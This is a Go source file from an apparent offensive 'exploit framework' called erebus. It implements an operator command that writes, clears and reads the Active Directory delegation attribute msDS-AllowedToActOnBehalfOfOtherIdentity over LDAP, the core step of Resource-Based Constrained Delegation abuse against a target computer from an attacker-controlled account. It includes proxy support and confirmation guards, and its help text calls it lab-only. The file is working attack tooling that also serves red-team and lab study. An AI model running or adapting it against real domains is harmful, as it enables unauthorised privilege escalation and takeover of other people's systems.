package preimplant

import (
	"fmt"

	"github.com/KKingZero/erebus-exploit-framwork/pkg/ldapcli"
)

// RunRBCD is host-side RBCD write/clear/show (no implant).
func RunRBCD(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", rbcdUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(rbcdUsage)
		return nil
	case "write", "set":
		return rbcdWrite(args[1:])
	case "clear", "delete", "del":
		return rbcdClear(args[1:])
	case "show", "read", "get":
		return rbcdShow(args[1:])
	default:
		return fmt.Errorf("unknown rbcd command %q\n%s", args[0], rbcdUsage)
	}
}

const rbcdUsage = `erebus rbcd — operator-host Resource-Based Constrained Delegation (no implant)

  erebus rbcd write --dc H --domain D --user U --pass-file P \
      --to HOST$ --from ATTACK$ --yes
  erebus rbcd clear --dc H --domain D --user U --pass-file P \
      --to HOST$ [--from ATTACK$] --yes
  erebus rbcd show  --dc H --domain D --user U --pass-file P --to HOST$

Writes msDS-AllowedToActOnBehalfOfOtherIdentity. Requires --yes for write/clear.
--from omitted on clear deletes the whole attribute.
Honors EREBUS_PROXY / ALL_PROXY (SOCKS5). Lab-only. Critical write.
`

func rbcdWrite(args []string) error {
	f, _ := ParseFlags(args)
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	to := first(f, "to", "target", "computer")
	from := first(f, "from", "delegate", "attacker")
	if to == "" || from == "" {
		return fmt.Errorf("usage: erebus rbcd write --to HOST$ --from ATTACK$ --yes")
	}
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing RBCD write on %q without --yes", to)
	}
	opts.RequireTLS = true
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("--domain required")
	}
	st, err := ldapcli.WriteRBCD(conn, base, to, from)
	if err != nil {
		return err
	}
	fmt.Printf("OK rbcd write --to %s --from %s\n", st.TargetSAM, from)
	printDelegators(st)
	return nil
}

func rbcdClear(args []string) error {
	f, _ := ParseFlags(args)
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	to := first(f, "to", "target", "computer")
	from := first(f, "from", "delegate", "attacker")
	if to == "" {
		return fmt.Errorf("usage: erebus rbcd clear --to HOST$ [--from ATTACK$] --yes")
	}
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing RBCD clear on %q without --yes", to)
	}
	opts.RequireTLS = true
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("--domain required")
	}
	st, err := ldapcli.ClearRBCD(conn, base, to, from)
	if err != nil {
		return err
	}
	if from == "" {
		fmt.Printf("OK rbcd clear --to %s (attribute deleted)\n", st.TargetSAM)
	} else {
		fmt.Printf("OK rbcd clear --to %s --from %s\n", st.TargetSAM, from)
	}
	printDelegators(st)
	return nil
}

func rbcdShow(args []string) error {
	f, _ := ParseFlags(args)
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	to := first(f, "to", "target", "computer")
	if to == "" {
		return fmt.Errorf("usage: erebus rbcd show --to HOST$")
	}
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("--domain required")
	}
	st, err := ldapcli.ReadRBCD(conn, base, to)
	if err != nil {
		return err
	}
	fmt.Printf("rbcd %s (%s)\n", st.TargetSAM, st.TargetDN)
	printDelegators(st)
	return nil
}

func printDelegators(st ldapcli.RBCDState) {
	if len(st.Delegators) == 0 {
		fmt.Println("delegators: (none)")
		return
	}
	fmt.Println("delegators:")
	for _, s := range st.Delegators {
		fmt.Printf("  %s\n", s)
	}
}
